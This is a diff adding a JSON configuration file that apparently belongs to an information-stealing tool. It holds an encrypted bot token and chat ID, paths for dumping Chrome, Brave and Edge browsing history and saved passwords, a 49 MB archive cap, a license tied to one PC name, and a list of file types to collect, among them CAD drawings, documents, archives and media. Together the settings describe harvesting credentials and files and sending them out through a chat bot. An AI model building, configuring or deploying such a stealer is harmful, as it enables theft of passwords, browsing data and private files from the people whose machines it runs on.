@@ -1,0 +1,24 @@
+{
+  "botToken": "AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEPYlf2INykKzFlHSF3HPLwAAAAACAAAAAAAQZgAAAAEAACAAAAAP20mDmN5hgiY8kE4Nyk9ItxO6Bg/CUvTPlKAdMq/4ewAAAAAOgAAAAAIAACAAAACP5CLChTRsFp1HLoI0YW81mOo6vMHhiuAptDbiYrpeCTAAAAA38hXUNE5m/8vQjy0lnbQm5tjOAqzRJLUZyyeDRcXJ41lAo97UaE3Wfx65zT0FAjRAAAAAMlRUCFkkygjB/72iTg1z+MP1qgnH83YMfwRcgkm0i62fuTlO+aL0epFAkTVUy8iGHMgzR6XNoFriviRCpeQa7A==",
+  "chatId": "AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEPYlf2INykKzFlHSF3HPLwAAAAACAAAAAAAQZgAAAAEAACAAAAB2rsFzTuIoopJFxRXSL3hfdRY7aerFRBRe4aO44tDmNwAAAAAOgAAAAAIAACAAAACj3oEMB8Ht7gmbTjQOwibzIAcyqWCklPGH9mA0QjLp+BAAAADGNtabPaXtshzrw6vXi0sjQAAAAPFR6y/itsO9FbCzIAWPVFK9Ao8Na9ZoeNqKnBvgp5OwMzHEEQpsZnGn59c4d6kdo6CH6lBgjrOIypSGt+E+WSE=",
+  "hstChrFilePath": "c:\\temp\\chr_hi.txt",
+  "hstBrvFilePath": "c:\\temp\\brv_hi.txt",
+  "hstEdgFilePath": "c:\\temp\\edg_hi.txt",
+  "pasChrFilePath": "c:\\temp\\chr_pas.txt",
+  "pasBrvFilePath": "c:\\temp\\brv_pas.txt",
+  "pasEdgFilePath": "c:\\temp\\edg_pas.txt",
+  "logFilePath": "c:\\temp\\test.txt",
+  "tempFolderPrefix": "C:\\temp\\temp_",
+  "maxArchiveSizeMB": 49,
+  "licenseYear": 2026,
+  "licensePcName": "DESKTOP-NCO579D",
+  "fileExtensions": [
+    "sldprt", "sldasm", "slddrw",
+    "dxf", "dwg",
+    "txt", "docx", "xlsx", "pdf",
+    "zip", "rar", "7z",
+    "png", "jpg", "jpeg", "bmp", "gif",
+    "mp4", "mp3", "wav",
+    "avi", "mkv", "flv", "mov", "wmv", "mpeg", "mpg", "m4v"
+  ]
+}
